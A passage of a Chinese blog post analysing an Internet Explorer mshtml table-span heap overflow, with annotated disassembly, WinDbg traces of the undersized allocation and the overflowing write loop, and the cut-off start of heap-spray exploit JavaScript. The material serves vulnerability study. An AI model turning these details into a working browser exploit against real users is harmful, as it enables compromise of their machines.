CTimerCtx::CTimerCtx(CTimerMan *,_RTL_CRITICAL_SECTION *)+ACp</span><br><span class="line">.text:74DF8F9C                                         ; CDocument::EnumObjects(ulong,IEnumUnknown * *)+6Bp ...</span><br><span class="line">.text:74DF8F9C</span><br><span class="line">.text:74DF8F9C ; FUNCTION CHUNK AT .text:74DF9013 SIZE 00000009 BYTES</span><br><span class="line">.text:74DF8F9C ; FUNCTION CHUNK AT .text:74EBD728 SIZE 00000007 BYTES</span><br><span class="line">.text:74DF8F9C</span><br><span class="line">.text:74DF8F9C                 mov     edi, edi</span><br><span class="line">.text:74DF8F9E                 push    edi             ; __int32</span><br><span class="line">.text:74DF8F9F                 mov     edi, ecx</span><br><span class="line">.text:74DF8FA1                 test    eax, eax</span><br><span class="line">.text:74DF8FA3                 jl      loc_74EBD728</span><br><span class="line">.text:74DF8FA9                 cmp     eax, [edi+8]</span><br><span class="line">.text:74DF8FAC                 ja      short loc_74DF9013</span><br><span class="line">.text:74DF8FAE                 xor     eax, eax</span><br><span class="line">.text:74DF8FB0                 pop     edi</span><br><span class="line">.text:74DF8FB1                 retn</span><br><span class="line">.text:74DF8FB1 ?EnsureSize@?$CDataAry@J@@QAEJJ@Z endp</span><br><span class="line">.text:74DF8FB1</span><br><span class="line">.text:74DF8FB1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:74DF8FB2                 db 5 dup(90h)</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; Attributes: bp-based frame</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; __int32 __thiscall CImplAry::EnsureSizeWorker(CImplAry *__hidden this, unsigned int, __int32)</span><br><span class="line">.text:74DF8FB7 ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z proc near</span><br><span class="line">.text:74DF8FB7                                         ; CODE XREF: CSelectionRenderingServiceProvider::GetSelectionChunksForLayout(CFlowLayout *,CRenderInfo *,CDataAry&lt;HighlightSegment&gt; *,int *,int *)-6B92p</span><br><span class="line">.text:74DF8FB7                                         ; CView::DeferTransition(COleSite *)+3Fp ...</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 dwBytes         = dword ptr -8</span><br><span class="line">.text:74DF8FB7 var_4           = dword ptr -4</span><br><span class="line">.text:74DF8FB7 Size            = dword ptr  8</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74E02CB4 SIZE 00000036 BYTES</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74E3BEEC SIZE 0000003D BYTES</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74EBD6E7 SIZE 0000000D BYTES</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7                 mov     edi, edi</span><br><span class="line">.text:74DF8FB9                 push    ebp</span><br><span class="line">.text:74DF8FBA                 mov     ebp, esp</span><br><span class="line">.text:74DF8FBC                 push    ecx</span><br><span class="line">.text:74DF8FBD                 push    ecx</span><br><span class="line">.text:74DF8FBE                 push    ebx</span><br><span class="line">.text:74DF8FBF                 push    esi             </span><br><span class="line">.text:74DF8FC0                 mov     esi, eax</span><br><span class="line">.text:74DF8FC2                 push    4</span><br><span class="line">.text:74DF8FC4                 pop     eax</span><br><span class="line">.text:74DF8FC5                 mov     [ebp+var_4], eax</span><br><span class="line">.text:74DF8FC8                 cmp     esi, eax</span><br><span class="line">.text:74DF8FCA                 jnb     loc_74E02CB4</span><br><span class="line">.text:74DF8FD0</span><br><span class="line">.text:74DF8FD0 loc_74DF8FD0:                           </span><br><span class="line">.text:74DF8FD0                                         ; CImplAry::EnsureSizeWorker(uint,long)+9D25j ...</span><br><span class="line">.text:74DF8FD0                 mov     eax, [ebp+var_4]; -&gt; eax=4</span><br><span class="line">.text:74DF8FD3                 mul     [ebp+Size]; -&gt;分配spansum*0x1C大小的内存，至少是0x1C*4=0x70</span><br><span class="line">.text:74DF8FD6                 push    edx</span><br><span class="line">.text:74DF8FD7                 push    eax;-&gt; size参数         </span><br><span class="line">.text:74DF8FD8                 lea     eax, [ebp+dwBytes]</span><br><span class="line">.text:74DF8FDB                 call    ?ULongLongToUInt@@YGJ_KPAI@Z ; ULongLongToUInt(unsigned __int64,uint *)</span><br><span class="line">.text:74DF8FE0                 mov     ebx, eax</span><br><span class="line">.text:74DF8FE2                 test    ebx, ebx</span><br><span class="line">.text:74DF8FE4                 jnz     short loc_74DF900B</span><br><span class="line">.text:74DF8FE6                 test    byte ptr [edi+4], 2</span><br><span class="line">.text:74DF8FEA                 jnz     loc_74E3BEEC</span><br><span class="line">.text:74DF8FF0                 push    [ebp+dwBytes] ;-&gt;spansum*0x1c=0x1c </span><br><span class="line">.text:74DF8FF3                 lea     esi, [edi+0Ch]</span><br><span class="line">.text:74DF8FF6                 call    ?_HeapRealloc@@YGJPAPAXI@Z ; -&gt;执行完CimplAry::EnsureSizeWorker函数保存的返回地址在CTableLayout+0x90+0xC，即导致漏洞的堆块，标记为vulheap</span><br><span class="line">.text:74DF8FFB                 mov     ebx, eax</span><br><span class="line">.text:74DF8FFD                 test    ebx, ebx</span><br><span class="line">.text:74DF8FFF                 jnz     short loc_74DF900B</span><br><span class="line">.text:74DF9001</span><br></pre></td></tr></table></figure></p><p>我们看下分配的缓冲区vulheap地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableLayout::CalculateMinMax+0x168</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00000001 ebx=0492aea8 ecx=00000000 edx=00000001 esi=0492af38 edi=0492af38</span><br><span class="line">eip=692d02f2 esp=0467e40c ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1d3:</span><br><span class="line">692d02f2 e8c08c0c00      call    mshtml!CImplAry::EnsureSizeWorker (69398fb7)</span><br></pre></td></tr></table></figure></p><p>分配的地址在ebx+0x9C<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=7741349f edx=00000000 esi=0492af38 edi=0492af38</span><br><span class="line">eip=692d02f7 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1df:</span><br><span class="line">692d02f7 85c0            test    eax,eax</span><br><span class="line">1:025&gt; dd ebx+9c</span><br><span class="line">0492af44  07e20f90 00000000 00000000 00000000</span><br><span class="line">0492af54  00000000 00000000 00000000 00000000</span><br><span class="line">0492af64  00000000 000000c8 000000c8 00000000</span><br><span class="line">0492af74  00000000 00000000 00000000 00000000</span><br><span class="line">0492af84  00000000 00000000 00000000 00000000</span><br><span class="line">0492af94  00000000 00000000 00000000 00000000</span><br><span class="line">0492afa4  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492afb4  00000001 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd 07e20f90 </span><br><span class="line">07e20f90  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fa0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fb0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fc0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20ff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e21000  ???????? ???????? ???????? ????????</span><br><span class="line"></span><br><span class="line">1:025&gt; !heap -p -a 07e20f90 </span><br><span class="line">    address 07e20f90 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 171000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 7e71f70:          7e20f90               70 -          7e20000             2000</span><br></pre></td></tr></table></figure></p><p>此外，我们看一下用于比较的spansum和spancmp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd ebx+54</span><br><span class="line">0492aefc  00000001 00000000 ffffffff 00000000</span><br><span class="line">0492af0c  ffffffff 691c9fd0 00000004 00000004</span><br><span class="line">0492af1c  0497eff0 691c9fd0 00000004 00000004</span><br><span class="line">0492af2c  04936ff0 00000000 00000000 691c9fd0</span><br><span class="line">0492af3c  00000000 00000004 07f27f90 00000000</span><br><span class="line">0492af4c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af5c  00000000 00000000 00000000 000000c8</span><br><span class="line">0492af6c  000000c8 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd ebx+94</span><br><span class="line">0492af3c  00000000 00000004 07f27f90 00000000</span><br><span class="line">0492af4c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af5c  00000000 00000000 00000000 000000c8</span><br><span class="line">0492af6c  000000c8 00000000 00000000 00000000</span><br><span class="line">0492af7c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af8c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af9c  00000000 00000000 00000000 00000000</span><br><span class="line">0492afac  00000000 ffffffff 00000001 00000000</span><br></pre></td></tr></table></figure></p><p>从上面的代码段可知，这里分配了0x70大小的内存地址在CtableLayout+0x9C指向的地址。<br>总结：</p><ul><li>CtableLayout::CalculateMinMax的第一个参数为CtableLayout对象，即table标签在内存中的对象。</li><li>CtableLayout+0x54：span属性值和spansum</li><li>CtableLayout+0x9C: 保存vulheap,至少分配0x70字节的内存</li><li>CtableLayout+0x94：用于和spansum比较的spancmp,当spancmp&gt;&gt;2小于spansum才分配漏洞堆块。</li></ul><p><strong>要注意的地方</strong><br><strong>再次g之后会出现允许activeX允许这个框，<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-173022.png" alt=""><br>然后发现<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-173337.png" alt=""><br>这我也不知道是中间再次在哪触发了这个函数，还是重新运行了poc，总之这个时候的spansum和spancmp都没变，分别为1和0.<br>我觉得可能是中间又在哪触发了吧，不像是重新运行了，我也不确定是为什么，没有完整的阅读这个模块。<br>总之再次g之后，就和泉哥书上一致了。spansum还是1，spancmp变成4.</strong></p><p>当分配完内存后，执行poc中的over_trigger函数时，会再一次断在CTableLayout::CalculateMinMax函数中，跟进去看下spansum和spancmp的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line"> 1 e 692d02f2     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax+0x1d3</span><br><span class="line">1:025&gt; bc 1</span><br><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br></pre></td></tr></table></figure></p><p>把之前设置的多余断点删掉，注意bc后跟的是断点的标号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; g</span><br><span class="line">(c84.e94): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.e94): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.8e8): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.758): Unknown exception - code 80010108 (first chance)</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=063bbea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd ebx+54</span><br><span class="line">082e6efc  00000001 ffffffff ffffffff ffffffff</span><br><span class="line">082e6f0c  ffffffff 691c9fd0 00000004 00000004</span><br><span class="line">082e6f1c  0816bff0 691c9fd0 00000004 00000004</span><br><span class="line">082e6f2c  082a2ff0 00000000 00000000 691c9fd0</span><br><span class="line">082e6f3c  00000004 00000004 070f4f90 00000000</span><br><span class="line">082e6f4c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f5c  00000000 00000000 00000000 000000c8</span><br><span class="line">082e6f6c  000000c8 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd ebx+94</span><br><span class="line">082e6f3c  00000004 00000004 070f4f90 00000000</span><br><span class="line">082e6f4c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f5c  00000000 00000000 00000000 000000c8</span><br><span class="line">082e6f6c  000000c8 00000000 00000000 00000000</span><br><span class="line">082e6f7c  00000000 00000000 00000000 00000001</span><br><span class="line">082e6f8c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f9c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6fac  00000000 ffffffff 00000001 00000000</span><br></pre></td></tr></table></figure><p>spansum为1，spancmp的值为4，(4&gt;&gt;2)为1==1,不发生跳转，不分配内存。</p><p>但是在over_trigger中，我们已经将span设置为1000了，这也是允许的最大值。<br>接着执行到mshtml!CTableLayout::CalculateMinMax+0x37e,我本来bp了一个断点在这，然后g一下，可是并没有断下来（这里没有断下来应该还是我断点下错了，没有进入那个断点的语句块），所以没办法，单步p呗，然后发现了新姿势，p 10能一次10下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=08864fd0 ebx=082e6ea8 ecx=00000032 edx=00000000 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a2e esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x37e:</span><br><span class="line">69465a2e e8d445dfff      call    mshtml!CTableCol::GetAAspan (6925a007)---&gt;获取span列数，此处返回1</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001--&gt;返回值 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a33 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x383:</span><br><span class="line">69465a33 3de8030000      cmp     eax,3E8h---&gt;span最多为1000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a38 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x388:</span><br><span class="line">69465a38 894510          mov     dword ptr [ebp+10h],eax ss:0023:0467e4bc=00000000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a3b esp=0467e410 ebp=0467e4ac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x38b:</span><br><span class="line">69465a3b 7c07            jl      mshtml!CTableLayout::CalculateMinMax+0x394 (69465a44) [br=1]</span><br></pre></td></tr></table></figure></p><p>在mshtml!CTableCol::GetAAspan下断点，让它第二次获取span值的时候断下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=082e6ea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0467df24</span><br><span class="line">eip=692d018a esp=0467dcc8 ebp=0467dee0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=08864fd0 ebx=082e6ea8 ecx=00000032 edx=00000000 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=6925a007 esp=0467dc24 ebp=0467dcc4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableCol::GetAAspan:</span><br><span class="line">6925a007 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; gu</span><br><span class="line">eax=000003e8---&gt;返回值，此时span的值已经是0x3e8即最大值1000了 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a33 esp=0467dc28 ebp=0467dcc4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x383:</span><br><span class="line">69465a33 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure></p><p>gu是执行到当前函数结束返回。<br>此时span的值已经是0x3e8即最大值1000了。<br>继续分析后续代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">text:74EC5AB3                 call    ?GetPixelWidth@CWidthUnitValue@@QBEHPBVCDocInfo@@PAVCElement@@H@Z ; CWidthUnitValue::GetPixelWidth(CDocInfo const *,CElement *,int)</span><br><span class="line">.text:74EC5AB8                 cmp     [ebp+var_5C], 0</span><br><span class="line">.text:74EC5ABC                 mov     [ebp+var_2C], eax;---&gt;计算width得到copydata=width*100</span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">.text:74EC5B3E                 mov     eax, [ebp+arg_8];-----&gt;span=1000</span><br><span class="line">.text:74EC5B41                 imul    ecx, 1Ch----&gt;1000*0x1C</span><br><span class="line">.text:74EC5B44                 add     [ebp+var_38], eax</span><br><span class="line">.text:74EC5B47                 mov     [ebp+var_20], ecx</span><br><span class="line">.text:74EC5B4A                 jmp     short loc_74EC5B4F；----&gt;vulheap地址</span><br><span class="line">.text:74EC5B4C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:74EC5B4C</span><br><span class="line">.text:74EC5B4C loc_74EC5B4C:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195A11j</span><br><span class="line">.text:74EC5B4C                 mov     ecx, [ebp+var_20]</span><br><span class="line">.text:74EC5B4F</span><br><span class="line">.text:74EC5B4F loc_74EC5B4F:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1959C0j</span><br><span class="line">.text:74EC5B4F                 mov     eax, [ebx+9Ch];----&gt;vulheap地址</span><br><span class="line">.text:74EC5B55                 add     eax, ecx;-----&gt;offset=vulheap+1000*0x1c&gt;0x70(vulheap大小)，最终会导致堆溢出！</span><br><span class="line">.text:74EC5B57                 cmp     [ebp+var_1C], 0</span><br><span class="line">.text:74EC5B5B                 mov     [ebp+var_24], eax;----&gt;作为后面AdjustForCol函数的参数</span><br><span class="line">.text:74EC5B5E                 jz      short loc_74EC5B7A</span><br><span class="line">.text:74EC5B60                 mov     eax, [ebp+arg_8]</span><br><span class="line">.text:74EC5B63                 cmp     eax, 1</span><br><span class="line">.text:74EC5B66                 jle     short loc_74EC5B7A</span><br><span class="line">.text:74EC5B68                 dec     eax</span><br><span class="line">.text:74EC5B69                 cmp     [ebp+var_14], eax</span><br><span class="line">.text:74EC5B6C                 jnz     short loc_74EC5B7A</span><br><span class="line">.text:74EC5B6E                 imul    eax, [ebp+var_C]</span><br><span class="line">.text:74EC5B72                 mov     ecx, [ebp+var_2C]</span><br><span class="line">.text:74EC5B75                 sub     ecx, eax        ; this</span><br><span class="line">.text:74EC5B77                 mov     [ebp+var_C], ecx</span><br><span class="line">.text:74EC5B7A                 push    [ebp+var_3C]    ; struct CCalcInfo *</span><br><span class="line">.text:74EC5B7D                 mov     eax, [ebp+var_34]</span><br><span class="line">.text:74EC5B80                 push    [ebp+arg_4]     ; int</span><br><span class="line">.text:74EC5B83                 mov     esi, [ebp+var_24]</span><br><span class="line">.text:74EC5B86                 push    [ebp+var_C]     ; ----&gt;前面经width计算得到的Copydata,即用于复制到vulheap的数据内容。</span><br><span class="line">.text:74EC5B89                 call    ?AdjustForCol@CTableColCalc@@QAEXPBVCWidthUnitValue@@HPAVCCalcInfo@@H@Z ; CTableColCalc::AdjustForCol(CWidthUnitValue const *,int,CCalcInfo *,int)</span><br></pre></td></tr></table></figure></p><p>复制的内容相当于<code>width * 100</code>得到的数值，比如此处为0x41，则复制内容为<code>0x41 * 1000=0x1004</code>。<br>在AdjustForCol中，会以1000 * 0x1c位计数循环向vulheap写入数据，最终造成heap溢出。<br>再g就崩溃了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-173750.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-173811.png" alt=""><br>总结</p><ol><li>当页面加载，CTableLayout::CalculateMinMax被首次调用，col的span属性被初始化为1，此时spansum=1,spancmp=0</li><li>由于(spancmp&gt;&gt;2)&lt;spansum,即0&lt;1,调用EnsureSizeWorker函数分配大小为<code>0x1c * spansum</code>的内存,但至少分配<code>0x1C * 4=0x70</code>大小的内存块。</li><li>分配内存后，spancmp=spansum * 4 = 4,此时(spancmp&gt;&gt;2)==spansum,即4/4==1，因此不再分配内存</li><li>调用over_trigger，CTableLayout::MinMax第二次被调用，但spansum和spancmp未变，而span被更改为1000，在复制内容为<code>width * 100</code>的数据到分配缓冲区时，会以span为循环计数器写vulheap堆块，但是<code>1000 * 0x1C &gt; 0x70</code>，最终造成堆溢出。</li></ol><p>经过调试，泉哥142页<code>shr eax,2</code>理解错了，那个shr是右移的意思，而泉哥写的是左移运算符&lt;&lt;</p><h2 id="实现漏洞利用"><a href="#实现漏洞利用" class="headerlink" title="实现漏洞利用"></a>实现漏洞利用</h2><p>关于exp的编写请参考漏洞战争，这里只调试一些关键思路。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"test"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        &lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line">                </span><br><span class="line"><span class="keyword">var</span> leak_index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> dap = <span class="string">"EEEE"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( dap.length &lt; <span class="number">480</span> ) dap += dap;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> padding = <span class="string">"AAAA"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( padding.length &lt; <span class="number">480</span> ) padding += padding;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filler = <span class="string">"BBBB"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( filler.length &lt; <span class="number">480</span> ) filler += filler;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//spray</span></span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">var</span> rra = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> div_container = <span 